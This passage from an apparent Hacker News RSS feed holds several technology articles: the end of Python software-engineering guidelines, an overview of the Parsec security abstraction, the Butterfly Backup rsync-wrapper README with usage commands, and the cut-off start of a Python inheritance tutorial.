<p>‚Äú<em>Branching</em>‚Äù is the term used to describe a point in the code where the business logic can go in one of several different ways. Branching adds complexity, as each possible path needs to be understood and tested in isolation. The way to reduce branching is to use fewer conditional statements (like <code>if</code>). Code that uses a lot of <code>if</code> statements (or other <em>conditional logic</em>) has many branches, which makes it difficult to follow, to debug and to test.</p>



<p>‚Äú<em>Side-effects</em>‚Äù is a term we use to describe any way in which the code affects its environment or the flow of execution, other than a function returning a value. Side effects, like branching, also increase the logical complexity of the code, making it less readable, difficult to follow and difficult to test.</p>



<p>As much as possible, minimise and isolate side effects. This includes not only I/O, network calls and OS interrupts, but also raising exceptions and modifying the internal state of data structures defined outside the function.</p>



<p>Of course, both branching and side-effects are unavoidable ‚Äì they are essential building blocks of any useful software system. The important thing is to remain conscious about the added complexity and do our best to stay on top of it.</p>



<p>Try to keep side effects <a href="https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html" target="_blank" rel="noreferrer noopener">higher up</a> in the call stack. This helps make code more reusable and simplifies testing by reducing the need to use mocks.</p>



<h2>Keep your code clean</h2>



<p>Keep function signatures clean, readable and consistent. This helps form team habits and expectations which increase productivity.</p>



<p>Make good use of type annotations / type hints in Python. They make the codebase more readable. The type checker is an essential tool in the build process that can catch both trivial errors and unexpected business logic behaviours. (Make sure to correctly use <code>Optional[int]</code> vs <code>int</code>, etc. ) There is no need to go overboard with annotations. Try to keep your annotations clean and simple. Messy annotations are often symptoms of design that can be improved (e.g. try to choose better data structures or refactor into even simpler functions).</p>



<p><a rel="noreferrer noopener" href="https://stackoverflow.com/questions/49002/prefer-composition-over-inheritance" target="_blank">Limit</a> the use of class inheritance. Keep inheritance hierarchies shallow. Overuse of inheritance makes code difficult to follow and often results in complex objects with unnecessary properties and methods. See also: ‚Äú<a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Liskov_substitution_principle" target="_blank">Liskov substitution principle</a>‚Äù. </p>



<h2>Keep your tests clean</h2>



<p>Keep tests clean, readable and concise. Avoid patching and mocking as much as possible. Messy tests are a symptom of messy code.</p>



<p>Remember, unit tests are meant to exercise units. Units should be small. Unit tests should be small.</p>



<p>A classical unit test provides some controlled input to a function (or method) and makes assertions about the return value.</p>



<p>Avoid writing tests which only assert on log entries or other side effects. If it‚Äôs impossible to test the function in any other way, it may be better to re-design the function to be testable in a more classical way.</p>



<p>Avoid writing tests that are overly concerned with HOW a method does what it does. E.g. tests which only make assertions about what other functions a method calls are missing the point of unit testing. Again, if there is no obviously better way to test that method, it may be better to spend time refactoring it instead of coming up with over-complicated but meaningless assertions.</p>



<p>When testing exceptions in Python, make use of <code>assertRaises()</code> instead of wrapping the function in a try / except block and failing the test explicitly in the else clause.</p>



<p>Whenever a more elaborate setup is required, which involves a lot of test data (e.g. configuration JSON, etc.) ‚Äì put the test data in an external fixture, instead of polluting the main test code with large blobs of data, making it difficult to read and maintain. </p>



<h2>Keep improving your mastery of the language</h2>



<p>Make the best possible use of the Python language (or whichever language you are using). Avoid reinventing the wheel or using libraries where a simpler language construct can do. In Python, make sure to master the use of list and dictionary comprehensions; the ternary operator (<code>"a if condition else b"</code>); the use of ‚Äú<code>or"</code> for fall-back values / defaults, generators, etc.</p>



<p>Continuously improve your knowledge of the (rather vast) Python standard library and the functions and constructs available, which do not require any external dependencies.</p>



<p>Learn a bit about functional programming and try to apply the main principles to your Python code as much as possible. Use the higher-order features of the language and the standard library for cleaner, more concise and more powerful functional programming solutions to common problems.</p>



<h2>Reduce reliance on external dependencies</h2>



<p>Scrutinise all dependence on external libraries and frameworks to keep them to the necessary minimum. Dependency cruft is a real thing ‚Äì and it can weigh a lot.</p>



<p>As much as possible, ensure use of the latest releases of all libraries and tools (including Python itself.) The problems you‚Äôll run into with ‚Äúbleeding edge‚Äù tools are less common than the problems you‚Äôll have with out-of-date tools.</p>



<p>In your Python virtual environment, make use of <a rel="noreferrer noopener" href="https://github.com/jazzband/pip-tools/" target="_blank">pip-tools</a> to stay on top of your <code>requirements.txt</code> files and dependency versions. </p>



<h2>Do your best to name things better</h2>



<p>Names are important (except when they‚Äôre not ‚Äì see next paragraph). It‚Äôs notoriously hard, but try your best to come up with short, concise, yet meaningful names to files, modules, classes, functions, variables, etc. It is generally safe to assume that whoever is reading your code has enough domain knowledge as to be familiar with the terminology in the context, but whenever possible, avoid too much jargon and stick to simpler terms / names. </p>



<p>The scope of named things is also important. For very short-lived, temporary variables (for example, those used in one-liners) it‚Äôs OK to use much shorter symbolic names (e.g., <code>a</code>, <code>b</code>, <code>i</code>, <code>n</code>) for the sake of brevity. For longer-lived, more important names, if the value of (or use of) the variable changes in a fundamentally different way to what it was when you first named it ‚Äì make sure to change the name as well. You don‚Äôt have to be extra frugal when dispensing new variables in those circumstances. It‚Äôs far more important that <code>original_values</code> changes to <code>processed_values</code> once it‚Äôs been modified, than to save a couple bytes of memory by stubbornly sticking to the old variable. </p>



<p>Avoid shadowing, redefining or overloading variables (or other names). This<br>makes logic difficult to follow by humans and often leads to mistakes. It also<br>makes code difficult to follow by static analysis tools ‚Äì e.g. type checkers<br>(MyPy / PyTypes spin extra hard to try and infer all possible types each time a<br>variable is redefined, which can lead to false positives as well as inefficient<br>type inference). Be particularly careful to avoid shadowing built-in keywords or<br>library names (e.g. <code>type</code>, <code>id</code>, <code>next</code>, <code>list</code>, etc.)</p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://corebrief.com/2021/02/19/some-practical-software-engineering-guidelines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195295</guid>
            <pubDate>Fri, 19 Feb 2021 17:15:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parsec: Platform Abstraction for Security (secure obj storage, crypto services)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195270">thread link</a>) | @Terretta
<br/>
February 19, 2021 | https://parallaxsecond.github.io/parsec-book/overview.html | <a href="https://web.archive.org/web/*/https://parallaxsecond.github.io/parsec-book/overview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
        <!-- Provide site root to javascript -->
        

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        

        <!-- Set the theme before any content is loaded, prevents flash -->
        

        <!-- Hide / unhide sidebar before it is displayed -->
        

        <nav id="sidebar" aria-label="Table of contents">
            
            
        </nav>

        <div id="page-wrapper">

            <div class="page">
                
                
                

                
                
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                

                <div id="content">
                    <main>
                        
<p><strong>Parsec</strong> is the <strong>P</strong>latform <strong>A</strong>bst<strong>R</strong>action for <strong>SEC</strong>urity, a new open-source initiative to
provide a common <a href="https://parallaxsecond.github.io/parsec-book/parsec_client/api_overview.html">API</a> to secure services in a platform-agnostic way.</p>
<p>Parsec aims to define a universal software standard for interacting with secure object storage and
cryptography services, creating a common way to interface with functions that would traditionally
have been accessed by more specialised APIs. Parsec establishes an ecosystem of developer-friendly
libraries in a variety of popular programming languages. Each library is designed to be highly
ergonomic and simple to consume. This growing ecosystem will put secure facilities at the fingertips
of developers across a broad range of use cases in infrastructure computing, edge computing and the
secure Internet of Things.</p>

<p>Today's computing platforms have evolved to offer a range of facilities for secure storage and
secure operations. There are hardware-backed facilities such as the Hardware Security Module (HSM)
or Trusted Platform Module (TPM). There are firmware services running in Trusted Execution
Environments (TEE). There are also cloud-based security services. At a bare minimum, security
facilities may be provided purely in software, where they are protected by mechanisms provided in
the operating system.</p>
<p>Over the years, software standards have emerged to allow developers to use these facilities from
their applications. But these standards bring with them the following challenges:</p>
<ul>
<li>They are defined with the expectation that the caller is the "owner" of the platform, meaning that
it has sole access to the underlying hardware. In reality, this is often not the case, because
the caller might reside in a container or virtual machine, where it is sharing the host hardware
with other applications. Existing software standards do not cater well for this situation.</li>
<li>They are defined exhaustively, with lengthy specifications detailing all permissible operations
and parameters. They are written from the perspective of the security device and its
capabilities, rather than from the perspective of the application and its use case. This can
offer a daunting and bewildering experience for developers, who spend a lot of time and effort
figuring out how to map their use case onto the API. There is nothing to tailor the API so that
it can be consumed easily for common, simple cases.</li>
<li>They are specific to a programming language such as C. To consume them in other languages, it is
necessary to use interoperability layers such as Foreign Function Interface (FFI), which can make
the developer experience even more cumbersome and unnatural. Interoperability layers can also be
a source of vulnerabilities.</li>
<li>Standards tend to be adopted based on some knowledge of the target platform. So while it might be
possible for code to be portable across multiple HSM vendors, for example, it is much harder to
make code portable between an HSM-based platform and a TPM-based platform.</li>
</ul>
<p>Parsec inverts this traditional approach to standardizing security interfaces, and it does so by
putting applications front and center. It offers an API that is no less comprehensive, but it does
so in a way that puts the needs of applications and their common use cases first.</p>
<p>Applications simply want the best-available security, and they want to be able to consume it in a
way that is simple, natural, and hard to get wrong.</p>
<p>The following observations can be made about such applications:</p>
<ul>
<li>They can be written in a variety of programming languages.</li>
<li>They may be written with no explicit knowledge of the hardware capabilities of the target
platform, such as whether an HSM or TPM is available.</li>
<li>They are often sharing the target platform hardware with other applications due to the use of
virtualization or containerization technology.</li>
<li>The secure assets owned by one application must be isolated from those owned by another. For
example, private keys provisioned on a hardware device must be isolated such that only the
provisioning application would be able to perform subsequent operations with those keys.</li>
<li>They have differing requirements in terms of permissible cryptographic algorithms and key
strengths.</li>
</ul>
<p>These observations motivate the need for a new platform abstraction that offers a common palette of
security primitives via a software interface that is both agnostic with respect to the underlying
hardware capabilities, and also capable of supporting multiple client applications on the same host,
whether those be within containers or within traditional virtual machines.</p>
<p>Parsec is a new software architecture and ecosystem that addresses this need.</p>

<p>Parsec is founded on the <a href="https://developer.arm.com/architectures/security-architectures/platform-security-architecture"><strong>Platform Security Architecture
(PSA)</strong></a>.
The PSA is a holistic set of threat models, security analyses, hardware and firmware architecture
specifications, and an open source firmware reference implementation. The PSA provides a recipe,
based on industry best practice, that allows security to be consistently designed in, at both a
hardware and firmware level.</p>
<p>One of the provisions of the PSA is the <a href="https://github.com/ARMmbed/mbed-crypto/blob/psa-crypto-api/docs/PSA_Cryptography_API_Specification.pdf"><strong>PSA Crypto
API</strong></a>.
The PSA Crypto API is a comprehensive library of modern security primitives covering the following
functional areas:</p>
<ul>
<li>Key provisioning and management</li>
<li>Hashing</li>
<li>Signing</li>
<li>Message Authentication Codes (MAC)</li>
<li>Asymmetric encryption</li>
<li>Symmetric encryption</li>
<li>Authenticated Encryption with Associated Data (AEAD)</li>
<li>Key derivation</li>
<li>Entropy (random number generation)</li>
</ul>
<p>A crucial characteristic of the PSA Crypto API is that applications always reference the keys
opaquely, making it ideally suited to implementations where keys are provisioned within hardware and
are never exposed.</p>
<p>The PSA Crypto API is defined in the C language. Parsec adopts the operations and contracts of the C
API, and uses them as the basis for a language-independent <a href="https://parallaxsecond.github.io/parsec-book/parsec_client/wire_protocol.html"><strong>wire
protocol</strong></a>. Each <a href="https://parallaxsecond.github.io/parsec-book/parsec_client/operations">operation</a> is defined,
along with all of its inputs and outputs, as a serializable contract, making it suitable to be
invoked over an Inter-Process Communication (IPC) transport. Parsec maintains functional equivalence
with the PSA Crypto API, but allows for out-of-process callers in any programming language.</p>

<p>The core component of Parsec is the <strong>security service</strong> (or <strong>security daemon</strong>). This is a
background process that runs on the host platform and provides connectivity with the secure
facilities of that host and surfaces the wire protocol based on PSA Crypto.</p>
<p>The security service listens on a suitable transport medium. The transport technology is one of
Parsec's many pluggable components, and no single transport is mandated. Choice of transport is
dependent on the operating system and the deployment. On Linux-based systems where the client
applications are running in containers (isolation with a shared kernel), the transport can be based
on Unix sockets.</p>
<p>Client applications make connections with the service by posting API requests to the transport
endpoint. This is usually done via a client library that hides the details of both the wire protocol
and the transport. This is one of the ways in which the client library simplifies the experience of
Parsec for application developers.</p>
<p>A single instance of the Parsec service executes on each physical host. In virtualized environments,
the Parsec service may reside on a specially-assigned guest, or potentially within the hypervisor.</p>
<p>The security service does not support remote client applications. Each physical host or node must
have its own instance of the service. However, it is possible for the service to initiate outbound
remote calls of other services, such as cloud-hosted HSM services.</p>

<p>In addition to surfacing the common API, the Parsec service is also responsible for brokering access
to the underlying security facilities amongst the multiple client applications. The exact way that
this is done will vary from one deployment to another. (See the section below on pluggable back-end
modules). Some of the brokering functionality may already reside in kernel drivers and other parts
of the software stack. The Parsec service is responsible for creating isolated views of key storage
and cryptographic services for each client application. The secure assets of one client must be kept
protected from those of another.</p>
<p>Central to this multi-tenant operation is the notion of <strong>application identity</strong> and the need for a
separate <strong>identity provider</strong> service. A Parsec-enabled host must contain an identity provider
service in addition to the Parsec service itself.</p>
<p>For more information about application identities and the identity provider, please refer to the
<a href="https://parallaxsecond.github.io/parsec-book/parsec_service/system_architecture.html"><strong>system architecture</strong></a> document.</p>

<p>The Parsec service employs a layered architecture, structured into a front-end and a back-end.</p>
<p>The front-end module provides the transport endpoint and listens for connections from clients. The
front-end understands the wire protocol and the common API. It is responsible for serialization and
de-serialization of the operation contracts.</p>
<p>The back-end modules are known as <strong>providers</strong>. An instance of the Parsec security service can load
one or more providers. Providers implement the API operations using platform-specific or
vendor-specific code. They provide the "last mile" of connectivity down to the underlying hardware,
software or firmware.</p>
<p>For a deeper dive into the modular structure of the Parsec service, please take a look at the
<a href="https://parallaxsecond.github.io/parsec-book/parsec_service/interfaces_and_dataflow.html"><strong>interfaces and dataflow</strong></a> design document.</p>
<p>Then delve into the <a href="https://parallaxsecond.github.io/parsec-book/parsec_service/source_code_structure.html"><strong>source code</strong></a> to discover the
back-end provider modules that exist. If you cannot find one that is compatible with the platform
you intend to use, then please consider contributing a new provider.</p>

<p>A key aim of Parsec is to evolve an ecosystem of developer-friendly client libraries in multiple
programming languages.</p>
<p>Parsec ‚Ä¶</p></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://parallaxsecond.github.io/parsec-book/overview.html">https://parallaxsecond.github.io/parsec-book/overview.html</a></em></p>]]>
            </description>
            <link>https://parallaxsecond.github.io/parsec-book/overview.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195270</guid>
            <pubDate>Fri, 19 Feb 2021 17:13:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backup is essential This is Butterfly Backup]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195250">thread link</a>) | @jajjarax
<br/>
February 19, 2021 | https://matteoguadrini.github.io/Butterfly-Backup/ | <a href="https://web.archive.org/web/*/https://matteoguadrini.github.io/Butterfly-Backup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        
        
        

        <p>Butterfly Backup is a simple command line wrapper of rsync for complex task, written in python.</p>

        
        <p><a href="https://github.com/MatteoGuadrini/Butterfly-Backup">View the Project on GitHub <small>MatteoGuadrini/Butterfly-Backup</small></a></p>
        

        

        
        <ul>
          <li><a href="https://github.com/MatteoGuadrini/Butterfly-Backup/zipball/master">Download <strong>ZIP File</strong></a></li>
          <li><a href="https://github.com/MatteoGuadrini/Butterfly-Backup/tarball/master">Download <strong>TAR Ball</strong></a></li>
          <li><a href="https://github.com/MatteoGuadrini/Butterfly-Backup">View On <strong>GitHub</strong></a></li>
        </ul>
        
      </header>
      <section>

      <p><img src="https://matteoguadrini.github.io/Butterfly-Backup/img/butterfly_backup.png" alt="Butterfly Backup"></p>

<p><img src="https://matteoguadrini.github.io/Butterfly-Backup/img/bb.png" alt="Greta oto"></p>

<p><a href="https://app.codacy.com/app/MatteoGuadrini/Butterfly-Backup?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=MatteoGuadrini/Butterfly-Backup&amp;utm_campaign=Badge_Grade_Dashboard"><img src="https://api.codacy.com/project/badge/Grade/7fc47024f17f4dffa3be08a7a5ab31bd" alt="Codacy Badge"></a>
<a href="https://circleci.com/gh/MatteoGuadrini/Butterfly-Backup"><img src="https://circleci.com/gh/MatteoGuadrini/Butterfly-Backup.svg?style=svg" alt="CircleCI"></a></p>


<p><strong>The plan is great when the backup plan is excellent!</strong></p>

<h2 id="what-is-that">What is that?</h2>
<p>Butterfly Backup is a <em>simple</em> command line wrapper of rsync for <em>complex</em> task, written in python.</p>

<h2 id="why-butterfly">Why butterfly?</h2>
<p>Butterfly Backup exploits the potential of rsync with maximum simplicity, maximum flexibility and more. Moreover,
its greatest strength is the organization of backups in a catalog, easy to consult.</p>

<h2 id="what-can-i-do">What can I do?</h2>
<p>With Butterfly Backup I can perform single or group backups (Full, Incremental, Differential and Mirror), restore, export, list and archive old backups.</p>

<h2 id="how-can-you-do-it">How can you do it?</h2>
<p>Naturally through the synergy of rsync and OpenSSH technology and the power of Python..</p>

<h2 id="which-platforms-support">Which platforms support?</h2>
<p>Butterfly Backup can backup Linux, BSD, MacOSX and Windows(with cygwin, see <a href="https://butterfly-backup.readthedocs.io/en/latest/">config docs</a>)</p>

<h2 id="real-uses">Real uses</h2>
<p>This list consists of only a few examples; applications can be endless:</p>
<ul>
  <li>Backing up periodically (ex. once a month) a folder where I store my photos over the years;</li>
  <li>Log‚Äôs backup of one or more servers;</li>
  <li>Backup of users of one or more machines;</li>
  <li>Backup system config of much servers;</li>
  <li>Create a backup snapshot of the my laptop;</li>
  <li>Create a central server than backupping client and server;</li>
  <li>Backup a entire file server, incrementally;</li>
</ul>

<h2 id="real-possibilities">Real possibilities</h2>
<ul>
  <li>Configuration for silently or bulk backup</li>
  <li>All backup are organized into a catalog</li>
  <li>List single or all backup by the catalog</li>
  <li>List detail of a single backup</li>
  <li>Backup single PC, with Full,Incremental,Differential and Mirror mode;</li>
  <li>Backup more PCs, with Full,Incremental,Differential and Mirror mode (with parallelism algorithm);</li>
  <li>Backup custom folder or predefined data (User,Config,Application,System,Log): see <a href="https://butterfly-backup.readthedocs.io/en/latest/#backup">backup docs</a></li>
  <li>Restore backup on the same PC</li>
  <li>Restore backup in other PC</li>
  <li>Restore backup in other operating system</li>
  <li>Apply retention policy to delete old backup</li>
  <li>Archive old backup in other file system or same (zip backup folder)</li>
  <li>Export one backup to another file system</li>
</ul>


<p><strong>Transform rsync in a powerfully backup/restore/archive tool</strong></p>

<h2 id="operation">Operation</h2>
<p>All operation of Butterfly Backup are <em>server to client</em>, agent-less. The server must be Unix machine with latest rsync installed.
This means that all commands must be executed by the backup server. Of course, nothing prevents the backup server from being itself (localhost).</p>

<p>To see all the operations and more examples, see the <a href="https://butterfly-backup.readthedocs.io/en/latest/">docs</a>.</p>

<h2 id="test">Test</h2>
<p>If you want to try or test Butterfly Backup before installing it, run the test:</p>
<div><div><pre><code><span>$</span><span> </span>git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git
<span>$</span><span> </span><span>cd </span>Butterfly-Backup
<span>$</span><span> </span>bash test_bb.py
<span>...
</span><span>[92512a6e-506e-11eb-b747-2ba55b805ea5]
type = Full
path = /tmp/bb_repo/localhost/2021_01_06__23_28
name = localhost
os = Unix
timestamp = 2021-01-06 23:28:59
start = 2021-01-06 23:28:59
end = 2021-01-06 23:29:04
status = 0
</span></code></pre></div></div>

<h2 id="installation">Installation</h2>
<p>Install Butterfly Backup is very simple; run this:</p>
<div><div><pre><code>git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git
<span>cd </span>Butterfly-Backup
<span>sudo </span>python3 setup.py
bb <span>--help</span>
man bb
</code></pre></div></div>

<h3 id="backup-machine">Backup machine</h3>
<p>Backup a single PC or server is a everyday task.
But most of the data may not change in the various backups made;
then, in these cases, an incremental backup is needed.
Butterfly Backup natively supports incremental and differential backups, starting from a full.
In this case, the first backup to be performed on the machine will be as follows:</p>
<div><div><pre><code>bb backup <span>--computer</span> pc1 <span>--destination</span> /nas/mybackup <span>--data</span> User Config <span>--type</span> MacOS <span>--mode</span> Full
</code></pre></div></div>
<p>or with short option:</p>
<div><div><pre><code>bb backup <span>-c</span> pc1 <span>-d</span> /nas/mybackup <span>-D</span> User Config <span>-t</span> MacOS <span>-m</span> Full
</code></pre></div></div>
<p>So we created a first <em>Full</em> backup, on a <em>MacOS</em> machine, considering the folders <em>User</em> -&gt; /Users and <em>Config</em> -&gt; /private/etc in the destination <em>/nas/mybackup</em></p>
<blockquote>
  <p><strong>Note</strong>: if you do not specify the user, Butterfly Backup will assume that the source and the destination know the same user; for example, I start the backup with the above command and my user is calling <em>arthur</em>, he will use the latter to log in to pc1.</p>
</blockquote>

<p>Now that we have our first Full backup, we can run <em>incremental</em> for the next few times.</p>
<div><div><pre><code>bb backup <span>--computer</span> pc1 <span>--destination</span> /nas/mybackup <span>--data</span> User Config <span>--type</span> MacOS
</code></pre></div></div>
<p>or with short option:</p>
<div><div><pre><code>bb backup <span>-c</span> pc1 <span>-d</span> /nas/mybackup <span>-D</span> User Config <span>-t</span> MacOS
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: Incremental mode performs a Full backup when they have not been done before.</p>
</blockquote>

<h3 id="restore-machine">Restore machine</h3>
<p>Before starting any restore, you need to understand what kind of data and in what time period you have to start.
So, let‚Äôs start checking our backups, with this command:</p>
<div><div><pre><code>bb list <span>--catalog</span> /nas/mybackup
</code></pre></div></div>
<p>The result will be the following:</p>
<div><div><pre><code>BUTTERFLY BACKUP CATALOG

Backup <span>id</span>: f65e5afe-9734-11e8-b0bb-005056a664e0
Hostname or ip: pc1
Timestamp: 2018-08-03 17:50:36

Backup <span>id</span>: 4f2b5f6e-9939-11e8-9ab6-005056a664e0
Hostname or ip: pc1
Timestamp: 2018-08-06 07:26:46

Backup <span>id</span>: cc6e2744-9944-11e8-b82a-005056a664e0
Hostname or ip: pc1
Timestamp: 2018-08-06 08:49:00
</code></pre></div></div>
<p>Select (copy) <em>Backup id</em> when you want restore a backup.
For exit, press <code>q</code>
Now, run this command for more detail (for example, try the first):</p>
<div><div><pre><code>bb list <span>--catalog</span> /nas/mybackup <span>--backup-id</span> f65e5afe-9734-11e8-b0bb-005056a664e0
</code></pre></div></div>
<p>The result will be the following:</p>
<div><div><pre><code>Backup <span>id</span>: f65e5afe-9734-11e8-b0bb-005056a664e0
Hostname or ip: pc1
Type: Full
Timestamp: 2018-08-03 17:50:36
Start: 2018-08-03 17:50:36
Finish: 2018-08-03 18:02:32
OS: MacOS
ExitCode: 0
Path: /nas/mybackup/pc1/2018_08_03__17_50
List: etc
Users
</code></pre></div></div>
<p>Now that we are sure that the selected backup is what we want (both in data and on date), run this command:</p>
<div><div><pre><code>bb restore <span>--computer</span> pc1 <span>--catalog</span> /nas/mybackup <span>--backup-id</span> f65e5afe-9734-11e8-b0bb-005056a664e0
</code></pre></div></div>
<p>So we have restored the data saved on the date indicated in our <em>pc1</em>.</p>

<h3 id="other-operation">Other operation</h3>
<p>With Butterfly Backup, you can perform Full, Incremental and Mirror backups, applying retention or archive rules;
you can activate the log function, so as to track any operation over time and/or increase verbosity.
Bulk backup operations can be performed using a simple text file, formatted in a list.
Is possible create, by means of openssh operations, a configuration and copy them into the machines impacted by the backup without causing the machine to request the password (key exchange).
For all this, <a href="https://butterfly-backup.readthedocs.io/en/latest/">Read the Docs</a> or run help:</p>




<h2 id="one-more-thing">One more thing</h2>
<p>The name butterfly, is born precisely because agent-less; like a butterfly takes the pollen from a flower and brings it elsewhere.
A backup or restore is performed without any iteration responsibility on the part of the final machine.
The performances are not altered.
While all the operations of Butterfly Backup are carried out, the impacted machine can continuously work with <em>peace of mind</em>.</p>

<h2 id="follow-the-project">Follow the project</h2>
<p>See the new features in development through this <a href="https://tree.taiga.io/project/matteoguadrini-butterfly-backup/kanban">link</a>.</p>

<h2 id="open-source">Open source</h2>
<p>Butterfly Backup is a open source project. Any contribute, It‚Äôs welcome.</p>

<p><strong>A great thanks</strong>.</p>

<p>For donations, press this</p>

<p>For me</p>

<p><a href="https://www.paypal.me/guos"><img src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" alt="paypal"></a></p>

<p>For <a href="http://www.telethon.it/">Telethon</a></p>

<p>The Telethon Foundation is a non-profit organization recognized by the Ministry of University and Scientific and Technological Research.
They were born in 1990 to respond to the appeal of patients suffering from rare diseases.
Come today, we are organized to dare to listen to them and answers, every day of the year.</p>

<p><a href="https://www.telethon.it/sostienici/dona-ora"> <img src="https://www.telethon.it/dev/_nuxt/img/c6d474e.svg" alt="Telethon" title="Telethon" width="200" height="104"> </a></p>

<p><a href="https://www.ioadottoilfuturo.it/">Adopt the future</a></p>


      </section>
      
    </div></div>]]>
            </description>
            <link>https://matteoguadrini.github.io/Butterfly-Backup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195250</guid>
            <pubDate>Fri, 19 Feb 2021 17:11:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Super-Post on Python Inheritance]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195226">thread link</a>) | @sjbitcode
<br/>
February 19, 2021 | https://sangeeta.io/posts/a-super-post-on-python-inheritance/ | <a href="https://web.archive.org/web/*/https://sangeeta.io/posts/a-super-post-on-python-inheritance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <span>Feb 16, 2021 ‚Ä¢ 30&nbsp;min read</span>
  
  <span>
    
        
        <a href="https://sangeeta.io/tag/python"><nobr>python</nobr>&nbsp;</a>
    
        
        <a href="https://sangeeta.io/tag/inheritance"><nobr>inheritance</nobr>&nbsp;</a>
    
        
        <a href="https://sangeeta.io/tag/mixin"><nobr>mixin</nobr>&nbsp;</a>
    
        
        <a href="https://sangeeta.io/tag/django"><nobr>django</nobr>&nbsp;</a>
    
  </span>
  <p>Inheritance is an object oriented feature which allows us to reuse logic by defining parent classes that pass on certain behavior to subclasses.</p>

<p>In this article, we‚Äôll cover some examples of inheritance with Python, the use of the <code>super()</code> function, and some practical examples of inheritance through the use of mixins. The focus will be more on understanding the complexities of multiple inheritance.</p>

<p>Feel free to skip ahead to any section, but I recommend reading in order:</p>
<ul>
<li><a href="#inheritance-101-">the basics of Python inheritance - only what you need to know</a> üë®‚Äçüë©‚Äçüëß‚Äçüë¶</li>
<li><a href="#multiple-inheritance-">multiple inheritance - setting the stage</a>  ü•û</li>
<li><a href="#mro-omg-wtf-">what even is MRO - the missing piece of the puzzle</a> üò≥</li>
<li><a href="#super-duper-super-">super() to the rescue - bringing flexibility to inheritance</a> üí•</li>
<li><a href="#mixins-">using mixins - multi-inheritance minus the confusion</a> üç™</li>
<li><a href="#star-wars-mixins-edition">mixins example - Star Wars</a> ‚ö°Ô∏è</li>
<li><a href="#django-mixins-edition-">mixins example - Django</a> üíö</li>
</ul>

<h3 id="inheritance-101-">Inheritance 101 üë®‚Äçüë©‚Äçüëß‚Äçüë¶</h3>
<p>Subclasses inherit all attributes and methods from a parent class if they don‚Äôt override them directly.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>In this example any Employee instance will have a <code>name</code> attribute and an <code>intro</code> method attached to it. Why? Because when we create an Employee instance, it doesn‚Äôt define its own <code>__init__</code> or <code>intro</code> methods, so it uses its parents‚Äô.</p>

<figure><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>e</span> <span>=</span> <span>Employee</span><span>(</span><span>'Sangeeta'</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>e</span>
<span>&lt;</span><span>__main__</span><span>.</span><span>Employee</span> <span>object</span> <span>at</span> <span>0x100774520</span><span>&gt;</span>
<span>&gt;&gt;&gt;</span> <span>e</span><span>.</span><span>name</span>
<span>'Sangeeta'</span>
<span>&gt;&gt;&gt;</span> <span>e</span><span>.</span><span>intro</span>
<span>&lt;</span><span>bound</span> <span>method</span> <span>Person</span><span>.</span><span>intro</span> <span>of</span> <span>&lt;</span><span>__main__</span><span>.</span><span>Employee</span> <span>object</span> <span>at</span> <span>0x100774520</span><span>&gt;&gt;</span>
<span>&gt;&gt;&gt;</span> <span>e</span><span>.</span><span>intro</span><span>()</span>
<span>"Hi I'm Sangeeta!"</span></code></pre></figure>

<hr>

<p>If we <em>did</em> define an empty <code>__init__</code> method on Employee, then the Person‚Äôs <code>__init__</code> method will never get called, and Employee will never inherit the <code>name</code> attribute from Person.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>):</span>
        <span>pass</span></code></pre></figure>

<p>When we create an Employee instance, we still have access to Person‚Äôs <code>intro</code> method, so technically we can set a <code>name</code> attribute afterwards and call <code>intro</code> successfully.</p>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> e <span>=</span> Employee<span>()</span>
<span>&gt;&gt;&gt;</span> e
&lt;__main__.Employee object at 0x109bd7640&gt;
<span>&gt;&gt;&gt;</span> e.intro
